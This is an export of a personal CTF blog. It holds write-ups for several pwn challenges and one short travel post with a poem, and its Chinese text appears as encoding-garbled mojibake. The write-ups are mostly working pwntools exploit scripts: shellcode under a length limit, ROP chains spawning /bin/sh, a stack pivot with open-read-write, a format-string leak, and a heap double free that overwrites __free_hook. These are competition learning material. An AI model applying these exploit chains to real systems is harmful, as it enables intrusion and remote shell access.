[{"title":"shellcode - æœ‰é•¿åº¦é™åˆ¶çš„ shellcode è§£æ³•","url":"/categories/CTF/241103-shellcode/","content":"shellcode\n\nshellcode æ˜¯ä¸€æ®µç”¨äºåˆ©ç”¨è½¯ä»¶æ¼æ´è€Œæ‰§è¡Œçš„ä»£ç ï¼Œshellcode ä¸º 16\nè¿›åˆ¶ä¹‹æœºæ¢°ç ï¼Œä»¥å…¶ç»å¸¸è®©æ”»å‡»è€…è·å¾— shell è€Œå¾—åã€‚shellcode\nå¸¸å¸¸ä½¿ç”¨æœºå™¨è¯­è¨€ç¼–å†™ã€‚ \n\nç¨‹åºåˆ†æ\né¢˜ç›®æ¥æºï¼šç¬¬ä¸ƒå±Šæµ™æ±Ÿçœå¤§å­¦ç”Ÿç½‘ç»œä¸ä¿¡æ¯å®‰å…¨ç«èµ›é¢„èµ›\n\n\nimage-20241103161301251\n\nchecksec\n\n\nä¿æŠ¤å…¨å¼€\n\né€†å‘åˆ†æ\n\n\nIDA ä¼ªä»£ç \n\nç¨‹åºçš„åŠŸèƒ½å¾ˆç›´æ¥ï¼Œæ‰§è¡Œè¾“å…¥çš„ä¸€æ®µ shellcodeï¼Œä½†æ˜¯æœ‰\n0xa çš„é•¿åº¦é™åˆ¶ã€‚\nå¹¶ä¸”å­˜åœ¨ memmem å‡½æ•°ï¼Œæ£€æŸ¥è¾“å…¥çš„å†…å®¹ï¼Œä½¿ç”¨ IDA ç»§ç»­æŸ¥çœ‹\nunk_203D çš„å†…å®¹ï¼Œå‘ç°æ˜¯å‡ºé¢˜äººç¦æ­¢äº† syscall\nçš„æœºå™¨ç ã€‚\n\n\nsyscall('0f')\n\nåŠ¨æ€è°ƒè¯•\n\nåœ¨ç¨‹åºæ‰§è¡Œ shellcode ä¹‹åï¼Œè§‚å¯Ÿå¯„å­˜å™¨å’Œæ ˆçš„æƒ…å†µã€‚å½“æ—¶æ¯”èµ›æ—¶å‘ç°\nr8 ä¸­å­˜æœ‰ syscall\næŒ‡ä»¤çš„åœ°å€ï¼Œæˆ‘çš„ä¸€ä¸ªæƒ³æ³•æ˜¯æ§åˆ¶å¯„å­˜å™¨ rax, rdi,\nrsi, rdx æ‰§è¡Œç³»ç»Ÿè°ƒç”¨ readã€‚\nmov rsi,rax\nxor rax,rax\nxor rdi,rdi\nadd rdx,0x50\ncall r8\nä¸è¿‡è¿™æ ·çš„é•¿åº¦å·²ç»è¶…å‡º 0xa çš„é™åˆ¶äº†ã€‚åé¢æˆ‘åˆæƒ³äº†å¾ˆä¹…ï¼Œæƒ³ç»§ç»­åˆ©ç”¨\nr8 è·³è½¬åˆ°æŸä¸ª main å‡½æ•°ä¸Šçš„æŒ‡ä»¤ï¼Œè°ƒè¯•å‘ç°ä»\nr8 åˆ°ä¸€ä¸ª main\nå‡½æ•°çš„åœ°å€éœ€è¦å‡å»ä¸‰ä½åå…­è¿›åˆ¶æ•°ï¼Œä¹Ÿå°±æ˜¯è¯´æ“ä½œæ•°å æ®äº† shellcode ä¸­ 0x4\nçš„é•¿åº¦äº†ã€‚å“ï¼Œç»“æœæˆ‘å°±è¿™æ ·å¿½è§†äº† rsp ä¸Šçš„\n&lt;main+0132&gt;ï¼Œä¸€ç›´åˆ°æ¯”èµ›ç»“æŸã€‚\næ”»å‡»æµç¨‹\nè¿™é‡Œçš„æ€è·¯æ˜¯ç™½å¤œå­¦é•¿æä¾›çš„ã€‚\nè°ƒæ•´ä¼ å‚å¯„å­˜å™¨ï¼Œæ§åˆ¶ç¨‹åºæµç¨‹\nELF ä¸­çš„ read å‡½æ•°å‚æ•°å¦‚ä¸‹\n\næ ˆä¸­çš„æ•°æ®å¦‚ä¸‹\n\n\nç”±äºç¨‹åºä¸­ä½¿ç”¨ call\nrax æ‰§è¡Œ shellcodeï¼Œè¿”å›åœ°å€å­˜åœ¨æ ˆé¡¶\n\nç¬¬ä¸€æ®µ shellcode\npop rdx; è¿”å›åœ°å€å‡ºæ ˆ\npop rdi; fd\npop rsi; å°†ä¸éœ€è¦çš„æ•°æ®å‡ºæ ˆ\npop rsi; *buf &lt;- shellcode address\nsud rdx,0x41; å‡å»åç§»ï¼Œç»“æœä¸º &lt;main+00f1&gt;\ncall rdx\nå°†ç¨‹åºè·³è½¬åˆ° main å‡½æ•°çš„ call _read å‰:\n\næ‰§è¡Œ shellcode\næ²¡æœ‰äº†è¯»å…¥é™åˆ¶åï¼Œç›´æ¥ä½¿ç”¨ pwntool ç”Ÿæˆçš„ shellcode å³å¯ã€‚\nExploit\nfrom pwn import *\ncontext.log_level = \"debug\"\ncontext.arch = \"amd64\"\np = process(\"./shellcode1\")\n#p = remote(\"139.155.126.78\", \"38681\")\nshellcode = \"\"\"\npop rdx;\npop rdi;\npop rsi;\npop rsi;\nsub rdx, 0x41;\ncall rdx;\n\"\"\"\ngdb.attach(p)\np.sendafter(b\"input\", asm(shellcode))\nshellcode = \"\"\"\nnop;\nnop;\nnop;\nnop;\nnop;\nnop;\nnop;\nnop;\nnop;\nnop;\n\"\"\" #10ä¸ªnopï¼Œå› ä¸ºä¸‹æ¬¡æ‰§è¡Œçš„åœ°å€æ˜¯åœ¨shellcode1çš„ç»“å°¾(call rdx)\nshellcode += shellcraft.sh()\np.send(asm(shellcode))\np.interactive()\nå°ç»“\nè¿™å›çš„çœèµ›å±äºæ˜¯åäº†å››å°æ—¶å¤§ç‰¢äº†ã€‚æ¯é“é¢˜ç›®æˆ–è€…æ˜¯åœ¨ç°å®å®è·µä¸­ï¼Œè‡ªç„¶æ˜¯ä¸ä¹‹å‰é‡åˆ°çš„æƒ…å†µä¼šæœ‰ä¸åŒã€‚å› æ­¤å¯¹ç¨‹åºåŠ¨æ€è¿è¡Œä¸­çš„å„ç§çŠ¶æ€åº”è¯¥æ•é”ä¸€äº›ï¼Œä¾‹å¦‚æ ˆã€å¯„å­˜å™¨ï¼Œå¯èƒ½ä¼šæœ‰å‘ç°ã€‚\n","categories":["CTF"],"tags":["pwn","shellcode"]},{"title":"é’±å¡˜æ±Ÿè¾¹","url":"/categories/%E6%97%A5%E5%B8%B8/20241106-daily/","content":"\nä¸€å¶èˆŸè½»ï¼ŒåŒæ¡¨é¸¿æƒŠã€‚æ°´å¤©æ¸…ã€å½±æ¹›æ³¢å¹³ã€‚é±¼ç¿»è—»é‰´ï¼Œé¹­ç‚¹çƒŸæ±€ã€‚è¿‡æ²™æºªæ€¥ï¼Œéœœæºªå†·ï¼Œæœˆæºªæ˜ã€‚\né‡é‡ä¼¼ç”»ï¼Œæ›²æ›²å¦‚å±ã€‚ç®—å½“å¹´ï¼Œè™šè€ä¸¥é™µã€‚å›è‡£ä¸€æ¢¦ï¼Œä»Šå¤ç©ºåã€‚ä½†è¿œå±±é•¿ï¼Œäº‘å±±ä¹±ï¼Œæ™“å±±é’ã€‚\nâ€”â€”ã€Šè¡Œé¦™å­ãƒ»è¿‡ä¸ƒé‡Œæ¿‘ã€‹ \n\n\n\næ‘„äº 2024/11/5 17:18 æ²¿æ±Ÿå¤§é“\n","categories":["æ—¥å¸¸"]},{"title":"DASCTF12 æœˆèµ›å¤ç°","url":"/categories/CTF/dasctf2025-12-wp/","content":"å‰è¨€\næœ¬æ¬¡ DASCTF\n12 æœˆèµ›å°è¯•äº† pwn æ–¹å‘çš„ä¸¤é“é¢˜ç›®ï¼Œæœ€ç»ˆè¿˜æ˜¯å¦‚æ„¿ä»¥å¿çš„çˆ†é›¶äº†ã€‚é¦–å…ˆçœ‹åˆ°é¢˜ç›®æˆ‘å°±æœ‰ç§é™Œç”Ÿçš„æ„Ÿè§‰ï¼Œç»™å®šç¨‹åºæ˜¯å»æ‰è°ƒè¯•ç¬¦å·çš„ï¼Œå¹¶ä¸”æœ‰å¤šä¸ªå‡½æ•°ï¼Œå¤§å¤§é™ä½äº†å¯è¯»æ€§ï¼Œå’Œæˆ‘å…ˆå‰é‡è§çš„é¢˜ç›®æœ‰ä¸å°çš„åŒºåˆ«ã€‚\n\nBaseMachine\nchecksec\n\n\nä¿æŠ¤å…¨å¼€\n\né€†å‘åˆ†æ\n\n\nmain\n\nè¯»å…¥ ./flag åä¼ å…¥\nsub_3990ï¼Œå›¾ä¸­çš„ä¹±ç æ˜¯è¡¨æƒ…ï¼Œæ˜¯ IDA çš„ç¼–ç é—®é¢˜ã€‚åé¢æ˜¯å¾ªç¯è¯»å…¥ç”¨æˆ·è¾“å…¥ï¼ŒåŒæ ·ä¼ å…¥\nsub_3990ã€‚\nè¿›å…¥ sub_3990 ç»§ç»­åˆ†æï¼š\n\n\nv9\n\næ ¹æ®ä¼ å…¥çš„å‚æ•° a1, a2\nå†³å®šç¨‹åºåç»­æµç¨‹ï¼Œå…·ä½“æ˜¯ç¼–ç ç±»å‹ (base64, base85...)ã€‚\næœ‰æ„æ€çš„æ˜¯ï¼Œç¨‹åºå°†å­—ç¬¦ä¸²çš„åŠ è§£å¯†æµç¨‹æ”¾åœ¨åœ¨ _data\nï¼Œå³æ•°æ®æ®µä¸­ã€‚\nv10 = ((__int64 (__fastcall *)(char *, const char *))*(&amp;off_7260 + v8))(s, a3);\n.data:0000000000007260 off_7260        dq offset sub_1D6A      ; DATA XREF: sub_3990+155â†‘o\n.data:0000000000007260                                         ; sub_3990+1C8â†‘o\n.data:0000000000007268                 dq offset sub_1ED6\n.data:0000000000007270                 dq offset sub_22B2\n.data:0000000000007278                 dq offset sub_27D4\n.data:0000000000007280                 dq offset sub_2B94\n.data:0000000000007288                 dq offset sub_2E17\n.data:0000000000007290                 dq offset sub_3498\n.data:0000000000007290 _data           ends\n.data:0000000000007290\nè¿™æ¶‰åŠåˆ° C è¯­è¨€ä¸­å‡½æ•°æŒ‡é’ˆçš„æ¦‚å¿µ:\nå‡½æ•°æŒ‡é’ˆæ˜¯ä¸€ä¸ªæŒ‡å‘å‡½æ•°çš„æŒ‡é’ˆå˜é‡ï¼Œå¦‚ï¼š\nint (*p)(int x, int  y);\nå…·æœ‰ä¸¤ä¸ªæ•´å‹å‚æ•°ï¼Œè¿”å›å€¼æ˜¯æ•´å‹ã€‚\nå¦‚ä¸‹ä»£ç å®ç°äº†é€šè¿‡å‡½æ•°æŒ‡é’ˆè°ƒç”¨å‡½æ•°ï¼š\nint maxValue (int a, int b) {\n    return a &gt; b ? a : b;\n}\n\nint (*p)(int, int) = NULL;\np = maxValue;\np(1, 2);\nè€Œé¢˜ç›®ç¨‹åºä¸­å°±æ˜¯é€šè¿‡ç±»ä¼¼è¿™æ ·çš„å‡½æ•°æŒ‡é’ˆæ•°ç»„å®ç°çš„ã€‚\næ¥ç€ï¼Œæ ¹æ®ä¸ unk_73C0 ä¸­çš„æ•°æ®æ¯”è¾ƒè¿™ä¸€åŠŸèƒ½å¯ä»¥ï¼ˆåº”è¯¥ï¼Ÿï¼‰æ¨æµ‹æ˜¯åœ¨è®¡ç®—å“ˆå¸Œ\n\n\nwp ä¸­æŒ‡å‡ºè¿™æ˜¯åœ¨è®¡ç®— SHA256\n\nå¦‚æœæ²¡æœ‰æ‰¾åˆ°ç›¸åŒçš„ï¼Œå°±ä½¿ç”¨æ–°çš„æ§½ä½ï¼š\n\n\né€‰æ‹©æœ€å…ˆæˆ–æœªä½¿ç”¨çš„æ§½ä½ï¼Œè¦†ç›–è¯¥æ§½ä½å­˜å‚¨çš„æ•°æ®\n\nå­˜ã€è¯»å–å“ˆå¸Œå’Œå¯†æ–‡éƒ¨åˆ†ï¼š\n\nè§£å¯†ã€è¾“å‡ºéƒ¨åˆ†ï¼š\n\n\næ˜¯å¦è¾“å‡ºç”±ä¼ å…¥å‚æ•° a4 å†³å®š\n\nVulnerabilities\nä¸ unk_73C0 è¯»å†™æœ‰å…³çš„å‡½æ•° sub_37A4\nä¸­å­˜åœ¨æº¢å‡ºæ¼æ´\n\n\næ•°ç»„åªèƒ½å‚¨å­˜ 0-5\n\n\n\nunk_73c0 å°†ç¼–ç ç±»å‹å’Œæ˜æ–‡å†™å…¥å¯¹åº”ä½ç½®\n\næ”»å‡»æµç¨‹\nä»¥ä¸‹ä¸ºå®˜æ–¹ wp æ€è·¯ã€‚\nå¯»æ‰¾å…·æœ‰ 'b85' å¼€å¤´ SHA256 å€¼çš„å­—ç¬¦ä¸²ï¼Œå°† flag æ§½ä½ä¸Šçš„å“ˆå¸Œä¿®æ”¹ä¸ºè¿™ä¸ªå€¼ã€‚å…·ä½“å®ç°å¦‚ä¸‹ï¼ˆæ¥è‡ªå®˜æ–¹ wpï¼‰ï¼š\n#!/usr/bin/env python3\nfrom pwncli import *\n\ncontext.terminal = [\"tmux\", \"splitw\", \"-h\", \"-l\", \"122\"]\nlocal_flag = sys.argv[1] if len(sys.argv) == 2 else 0\n\nif local_flag == \"remote\":\n    addr = ''\n    host = addr.split(' ')\n    gift.io = remote(host[0], host[1])\n    gift.remote = True\nelse:\n    gift.io = process('./BaseMachine')\n    if local_flag == \"nodbg\":\n        gift.remote = True\ninit_x64_context(gift.io, gift)\nlibc = load_libc()\ngift.elf = ELF('./BaseMachine')\ncmd = '''\n    c\n'''\n\n\nfor i in range(3):\n    sla(\"ğŸ« ğŸ« ğŸ« \", 'plain b64 ' + str(i))\n\nlaunch_gdb(cmd)\nsla(\"ğŸ« ğŸ« ğŸ« \", b'plain b85 ' + b'aaaa' * 10 + b'a')\nru(\"ğŸ˜ğŸ˜ğŸ˜ \")\ndata = ru(b'\\n', drop=True)\npad1 = data[0:5]\npad2 = data[-5:]\n\n# Match found! String: 6eU, SHA-256: b8509ba8fe72a1a7755d30eb9f16d4337774beab47a9d59d51a659c8ea8ce888\n\nfor i in range(1, 8):\n    sla(\"ğŸ« ğŸ« ğŸ« \", b'b85 plain ' + b'09ba8fe72a1a7755d30eb9f16d4337774beab47a9d59d51a659c8ea8ce888aaaa' + pad1 * i + pad2 + pad1 * (10 - i))\n\nsla(\"ğŸ« ğŸ« ğŸ« \", b'plain b64 6eU')\nru(\"ğŸ˜ğŸ˜ğŸ˜ \")\nflag = ru(b'\\n', drop=True)\nsla(\"ğŸ« ğŸ« ğŸ« \", b'b64 plain ' + flag)\n\nia()\næ€»ç»“\nè¿™é¢˜çš„ä½œè€…å¯è§å¯¹ç¼–ç éå¸¸ç†Ÿæ‚‰ï¼Œç›®å‰æˆ‘è¿˜æ²¡æœ‰å¯¹ base ç³»åˆ—æœ‰ä¸€ä¸ªå¤ªæ¸…æ™°çš„äº†è§£ã€‚æœ€å¤šçŸ¥é“å®ƒå¤§æ¦‚çš„åŸç†ï¼Œæˆ–è€…ä»¿å†™åŠ è§£å¯†çš„ä»£ç ä¹‹ç±»çš„ã€‚ä»¥åæœ‰ç©ºæˆ‘ä¼šå°è¯•æ‰‹æ“ä¸€ä¸‹å„ç§ base çš„åŠ è§£å¯†çš„ï¼ˆä¹‹å‰æ¥è§¦ base æ˜¯ hgame-mini\n2024 ä¸Šçš„ä¸€é“é€†å‘é¢˜ â€”â€”base emojiï¼‰ã€‚å¦å¤–å¯¹ä»£ç çš„é˜…è¯»èƒ½åŠ›ä¹Ÿæœ‰å¾…æå‡ã€‚\n","categories":["CTF"],"tags":["pwn","ä»£ç å®¡è®¡","å‡½æ•°æŒ‡é’ˆ"]},{"title":"HGAME 2025 Week 1 Writeup","url":"/categories/CTF/hgame-2025-week1-wp/","content":"counting petals\nVulnerabilities\n\nå­˜åœ¨è¶Šç•Œå†™å…¥æ¼æ´ã€‚ \n\nå­˜åœ¨ä»»æ„è¯»æ¼æ´ã€‚\n\nExploit\nè§‚å¯Ÿæ ˆç»“æ„ï¼Œæ„é€ æ•°æ®ä½¿ v9=16 æ—¶ä»¤ v8,\nv9 ä¸ºä¸åˆæ³•çš„å€¼ï¼Œä»è€Œæ³„éœ²æ ˆä¸Šçš„ libc åœ°å€ã€‚\nç¬¬äºŒæ¬¡å¾ªç¯æ—¶åˆ©ç”¨ä»»æ„å†™ï¼Œæ„é€  ROP é“¾ã€‚\nfrom pwn import *\ncontext.log_level = \"debug\"\np = remote(\"node2.hgame.vidar.club\",32442)\nlibc = ELF(\"./libc.so.6\")\ne = ELF(\"./vuln\")\npop_rdi_off = 0x2a3e5\npop_rsi_off = 0x2be51\npop_rdx_r12_off= 0x11f2e7\np.sendlineafter(\"How many flowers have you prepared this time?\",\"16\")\nfor i in range(15):\n    p.sendlineafter(\"the flower number\",str(0))\np.sendlineafter(\"the flower number\",str(0x1400000013))\np.sendlineafter(\"latter:\",str(1))\np.recvuntil(b\"+ 1 + \")\nnumber = p.recvuntil(b\" +\", drop=True)\nnumber = number.decode().strip()\nlibc_address = int(number)\nlog.info(hex(libc_address))\nlibc_base = libc_address - 0x29D90\nlog.info(hex(libc_base))\nsys_addr = libc_base + libc.sym[\"execve\"]\nbinsh_addr = libc_base + next(libc.search(b\"/bin/sh\"))\npop_rdi = libc_base + pop_rdi_off\npop_rsi = libc_base + pop_rsi_off\npop_rdx_r12 = libc_base + pop_rdx_r12_off\np.sendlineafter(\"How many flowers have you prepared this time?\",\"16\")\npause()\nfor i in range(15):\n    p.sendlineafter(\"the flower number\",str(0))\np.sendlineafter(\"the flower number\",str(0x120000001a))\np.sendlineafter(\"the flower number\",str(pop_rdi)) \np.sendlineafter(\"the flower number\",str(binsh_addr))\np.sendlineafter(\"the flower number\",str(pop_rsi))\np.sendlineafter(\"the flower number\",str(0))\np.sendlineafter(\"the flower number\",str(pop_rdx_r12))\np.sendlineafter(\"the flower number\",str(0))\np.sendlineafter(\"the flower number\",str(binsh_addr))\np.sendlineafter(\"the flower number\",str(sys_addr)) \np.sendlineafter(\"latter:\",str(1))\np.interactive()\nezstack\næ ¹æ®é¢˜ç›®æ‰€ç»™çš„ Dockerfile è·å–è¿œç¨‹ç¯å¢ƒç›¸åº”çš„ libc:\ndocker build -t pwn:v1 .\n\nç¦ç”¨ execve\nVulnerabilities\n\nå­˜åœ¨æ ˆæº¢å‡ºæ¼æ´ã€‚\n\nå¯ä»¥ä¿®æ”¹ rbp è¿›è¡Œæ ˆè¿ç§»ã€‚\n\næœ‰å¤§æ®µçš„å¯å†™å¯è¯»æ®µã€‚\nExploit\næ ˆè¿ç§»åˆ°æ°å½“ä½ç½®ï¼Œä»¤ fd=4\næ³„éœ² libc åœ°å€ï¼Œå¹¶è°ƒæ•´ç¨‹åºè¯»å…¥çš„é•¿åº¦ï¼Œæ–¹ä¾¿åç»­å­˜æ”¾ ROP é“¾ã€‚\nfrom pwn import *\ncontext.log_level =\"debug\"\np = remote(\"node1.hgame.vidar.club\",32351)\ne = ELF(\"./vuln\")\nlibc = ELF(\"./libc-2.31.so\")\nwrite_plt = e.plt['write']\nwrite_got = e.got['write']\nwritable_addr = 0x404154\nread_ret = 0x40140f\npop_rdi = 0x401713\npop_rsi_r15 = 0x401711\nleave_ret = 0x401425\nprint(\"plt:\",hex(write_plt))\nprint(\"got:\",hex(write_got))\npause()\npayload = b'a' * 80 + p64(writable_addr) + p64(read_ret)\np.sendafter(\"Good luck.\",payload)\npause()\npayload = flat({\n    0x00: [\n        p64(writable_addr),\n        p64(pop_rdi),\n        p64(0x4),\n        p64(pop_rsi_r15),\n        p64(write_got),p64(0),\n        p64(write_plt), #write(4,&lt;write@got&gt;)\n        p64(read_ret),\n        p64(leave_ret),\n    ],\n    0x50: [\n        p64(writable_addr-0x50),\n        p64(leave_ret),\n    ]\n})\np.send(payload)\nwrite_address = u64(p.recvuntil('\\x00\\x00',drop=True)[-6:].ljust(8, b'\\x00'))\nlibc_base = write_address - 0x10e280\nlog.info(hex(libc_base))\npop_rdx_r12 = libc_base + 0x119431\npop_rsi = libc_base + 0x2601f\n_read= libc_base + libc.symbols[\"read\"]\n_open= libc_base + libc.symbols[\"open\"]\n_write= libc_base + libc.symbols[\"write\"]\npayload = flat({\n    0x00: [\n        p64(0x404154+0xd0),\n        p64(pop_rsi),\n        p64(0x404154),\n        p64(pop_rdx_r12),\n        p64(0x200),p64(0), \n        p64(_read),# read(4,buf,0x200)\n        p64(leave_ret),\n        p64(leave_ret),\n    ],\n    0x50: [\n        p64(writable_addr-0x50),\n        p64(leave_ret),\n    ]\n})\npause()\np.send(payload)\npayload = flat({\n    0x00: [\n        p64(0xc0ffee),\n        p64(pop_rdi),\n        p64(0x404154+0xe0),\n        p64(pop_rsi),\n        p64(0),\n        p64(pop_rdx_r12),\n        p64(0),p64(0),\n        p64(_open), # open(./flag,0,0)\n        p64(pop_rdi),\n        p64(0x5),\n        p64(pop_rsi),\n        p64(0x404154+0xe0),\n        p64(pop_rdx_r12),\n        p64(0x100),p64(0),\n        p64(_read), #read(5,buf,0x100)\n        p64(pop_rdi),\n        p64(0x4),\n        p64(pop_rsi),\n        p64(0x404154+0xe0),\n        p64(pop_rdx_r12),\n        p64(0x30),p64(0),\n        p64(_write), #write(4,buf,0x20)\n    ],\n    0xd0: [\n        p64(0x404154),\n        p64(leave_ret),\n    ],\n    0xe0: [\n        b'./flag\\x00',\n    ]\n})\npause()\np.send(payload)\np.interactive()\nformat\nVulnerabilities\n\næ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚\n\n\næ•´å‹åˆ¤æ–­ï¼Œä½¿ç”¨æ— ç¬¦å·æ•´å‹ä¼ å…¥ã€‚è¾“å…¥ä¸€ä¸ªè´Ÿæ•°å³å¯ç»•è¿‡è¾“å…¥é•¿åº¦çš„é™åˆ¶ã€‚\n\nå¯ä»¥æ ˆè¿ç§»ã€‚\nExploit\nä½¿ç”¨ %p æ³„éœ²æ ˆçš„åœ°å€ï¼Œåœ¨ vuln\nå‡½æ•°çš„æ ˆå¸§å†…å†™å…¥æ›´é•¿çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œç„¶åæ§åˆ¶ rbp\nåˆ°åˆé€‚ä½ç½®ï¼Œæº¢å‡ºè¦†ç›–è¿”å›åœ°å€ä¸ºæ ¼å¼åŒ–æ¼æ´å¤„ï¼Œæ³„éœ² libc åœ°å€ï¼Œå†æ¬¡è¿›å…¥\nvuln æ„é€  ROP é“¾ã€‚\nfrom pwn import *\ncontext.log_level =\"debug\"\np = remote(\"node1.hgame.vidar.club\",30762)\ne = ELF(\"./vuln\")\nlibc = ELF(\"./libc.so.6\")\nleave_ret = 0x4011ee\nmain = 0x4011f0\np.sendlineafter(\"you have n chance to getshell\",str(1))\np.sendlineafter(\"type something:\",\"%p\")\np.recvuntil(b\"you type: 0x\")\nstack_addr = p.recvuntil(b\"you have\", drop=True)\nstack_addr = int(stack_addr,16)\nlog.info(hex(stack_addr))\nrbp = stack_addr + 0x211c\np.sendafter(\"n = \",\"-1\\x00\")\npause()\npayload = flat({\n    0x00: [\n        b'%9$p',\n        p64(rbp),\n        p64(0x4012cf),\n    ]\n})\np.sendafter(\"type something:\",payload)\np.recvuntil(b\"0x\",drop=True)\nlibc_addr = p.recv(12)\nlibc_addr = int(libc_addr,16)\nlibc_base = libc_addr - 0x29d90\nlog.info(hex(libc_base))\n\nbinsh_addr = libc_base + next(libc.search(b\"/bin/sh\"))\nsys_addr = libc_base + libc.sym[\"system\"]\npop_rdi = libc_base + 0x2a3e5\npayload = flat({\n    0x0c: [\n        p64(0x40101a),\n        p64(pop_rdi),\n        p64(binsh_addr),\n        p64(sys_addr)\n    ]\n})\np.sendafter(\"type something:\",payload)\np.interactive()\nCompress dot new\né¢˜ç›®ç»™å‡º Nushell ç¼–å†™çš„ Huffman ç¼–ç ï¼Œè§£ç ä»£ç å¦‚ä¸‹\ndef \"decode\" [tree encoded] {\n    let bits = ($encoded | split chars)\n    mut result = []\n    mut current_node = $tree\n    for bit in $bits {\n        $current_node = if $bit == '0' {\n            $current_node.a\n        } else { $current_node.b }\n        if 's' in $current_node {\n            $result ++= [$current_node.s]\n            $current_node = $tree\n        }\n    }\n    if 's' in $current_node {\n        $result ++= [$current_node.s]\n    }\n    $result | each { into binary } | bytes collect\n}\n\ndef \"decompress\" [] {\n    let input = (open ./enc.txt --raw | split row \"\\n\")\n    let tree = $input.0 | from json\n    let encoded_str = $input.1\n    decode $tree $encoded_str\n}\n\ndecompress | save ./flag.txt --force\néƒ¨åˆ†å†…å®¹å‚è€ƒ DeepSeek R1 ç”Ÿæˆ\nTurtle\n\nDIE æ£€æµ‹å­˜åœ¨ upx å£³ï¼Œä½¿ç”¨ x64dbg å®šä½ç¨‹åºå…¥å£ç‚¹å dump è„±å£³ã€‚\nç¨‹åºä½¿ç”¨ä¸¤æ¬¡ RC4\nåŠ å¯†ï¼Œä¾è¯¥åŠ å¯†ç®—æ³•çš„å¯¹ç§°æ€§è´¨ï¼Œç¬¬ä¸€æ¬¡åŠ å¯†å‡½æ•°å¤„ä¼ å…¥å¯†æ–‡å¾—åˆ° keyã€‚\nç¬¬äºŒæ¬¡åŠ å¯†å‡½æ•°å¤„å°† -= patch ä¸º\n+=ï¼Œä¼ å…¥å¯†æ–‡å¾—åˆ° flagã€‚\n\n","categories":["CTF"],"tags":["pwn","re","hgame"]},{"title":"HGAME 2025 Week 2 Writeup","url":"/categories/CTF/hgame-2025-week2-wp/","content":"Signin2Heap\nVulnerabilities\n\nå­˜åœ¨ off-by-null æ¼æ´ï¼Œå½“ prev_size åŸŸå¤ç”¨æ—¶ï¼Œå¯ç½®é›¶ç›¸é‚»\nchunk çš„ prev_inuse ä½ã€‚\n\n\nåªèƒ½ç”³è¯·è‡³å¤š 0xFF å¤§å°çš„å †å—ï¼Œè€ƒè™‘ fastbin attackã€‚\nExploit\nç”±äºç¨‹åºæ²¡æœ‰ç¼–è¾‘åŠŸèƒ½ï¼Œåªèƒ½ä½¿ç”¨ add åŠŸèƒ½ä¿®æ”¹å †æ•°æ®ã€‚å¸ƒç½®å¤§å°åˆ†åˆ«ä¸º\n0xf0, 0x68, 0xf0\nçš„ä¸‰ä¸ªå †å—ï¼Œç„¶åå°† 0xf0 å¤§å°çš„ tcache bin\nå¡«æ»¡ã€‚æ­¤æ—¶é‡Šæ”¾ chunk 0ï¼Œå°†è¿›å…¥ unsorted bin\nã€‚ä¸ºäº†æ³„éœ²å‡º libc æœ‰å…³åœ°å€ï¼Œæˆ‘ä»¬éœ€è¦åˆ©ç”¨ show åŠŸèƒ½è¾“å‡º freed chunk\nä¸Šçš„æŒ‡é’ˆ (å³ fd )ã€‚é€šè¿‡å¦‚ä¸‹æ“ä½œå¯ä»¥å®ç°ç±»ä¼¼ UAF çš„æ•ˆæœï¼š\n\nä¿®æ”¹ chunk 2 çš„ prev_size å’Œ prev_inuse\nï¼›\né‡Šæ”¾ chunk 2ï¼Œå¼•èµ·å‘ååˆå¹¶ï¼Œæ­¤æ—¶å †ç®¡ç†å™¨è®¤ä¸º chunk 0 ~ chunk 2\néƒ½å·²ç»ä¸ºç©ºé—²çŠ¶æ€ï¼Œæ”¾å…¥ unsorted bin ï¼›\nå…ˆæ¸…ç©ºä¼˜å…ˆçº§æ›´é«˜çš„ tcache bin ï¼Œç„¶åç”³è¯· chunk 0\nå¤§å°çš„å †ï¼Œä» unsorted bin ä¸­å–ï¼Œæ­¤æ—¶ fd ç§»åŠ¨åˆ° chunk 0\nçš„åé¢ã€‚\n\nç»è¿‡ä»¥ä¸Šæ“ä½œåï¼Œchunk 1 çš„ä½ç½®æ°å¥½æ˜¯ unsorted bin\nçš„å¤´éƒ¨ã€‚ä½†åŒæ—¶ç¨‹åºé€»è¾‘ä¸Š chunk 1 å¹¶æ²¡æœ‰è¢«é‡Šæ”¾ï¼Œå¼•èµ·äº† UAFï¼Œdouble\nfreeã€‚\nå†æ¬¡å¡«æ»¡ tcache bin ï¼Œåˆ©ç”¨ fastbin double free\nå¯å®ç°ä»»æ„å†™ã€‚\nfrom pwn import *\ncontext.log_level =\"debug\"\np = remote(\"node1.hgame.vidar.club\",32253)\ne = ELF(\"./vuln\")\nlibc = ELF(\"./libc-2.27.so\")\ndef add(index,size,content):\n    p.sendafter(\"Your choice:\",b\"\\x01\\x00\")\n    p.sendlineafter(\"Index:\",str(index))\n    p.sendlineafter(\"Size: \",str(size))\n    p.sendafter(\"Content: \",content)\ndef show(index):\n    p.sendafter(\"Your choice:\",b\"\\x03\\x00\")\n    p.sendlineafter(\"Index:\",str(index))\ndef dele(index):\n    p.sendafter(\"Your choice:\",b\"\\x02\\x00\")\n    p.sendlineafter(\"Index:\",str(index))\nadd(0,0xf0,'a')\nadd(1,0x68,'a')\nadd(2,0xf0,'b')\nfor i in range(3,10):\n  add(i,0xf0,'a')\nfor i in range(3,10): #fill tcache\n   dele(i)\ndele(0)\ndele(1)\nadd(1,0x68,b'a'*0x60+p64(0x170))\ndele(2)\nfor i in range(3,10):\n  add(i,0xf0,'a')\nadd(0,0xf0,'a')\nshow(1)\nmain_arena = u64(p.recvuntil('\\x0a\\x31',drop=True)[-6:].ljust(8, b'\\x00'))\nlibc_base = main_arena - 0x3ebca0\nlog.info(hex(libc_base))\nfree_hook = libc_base + libc.symbols['__free_hook']\none_gadget = libc_base + 0x4f302\nadd(11,0x30,'a')\nadd(12,0x30,'a')\nfor i in range(3,10):\n    dele(i)\nfor i in range(3,10):\n    add(i,0x30,'a')\nfor i in range(3,10): #fill tcache\n    dele(i)\ndele(11)\ndele(12) #a padding chunk\ndele(1) #fastbin double free\nfor i in range(3,10):\n    add(i,0x30,'a') #clear tcache\nadd(1,0x30,p64(free_hook))\nadd(12,0x30,'qaq')\nadd(11,0x30,'qaq') #clear padding chunk\nadd(13,0x30,p64(one_gadget)) #a chunk at &lt;__free_hook&gt;\ndele(0)\np.interactive()\nWhere is the vulnerability\n\nç¬¬ä¸€æ¬¡æ‰“è¿™ä¹ˆé«˜ç‰ˆæœ¬çš„\nlibcï¼ˆåŸè°…æˆ‘å½“æ—¶è„‘æŠ½çœ‹æˆ 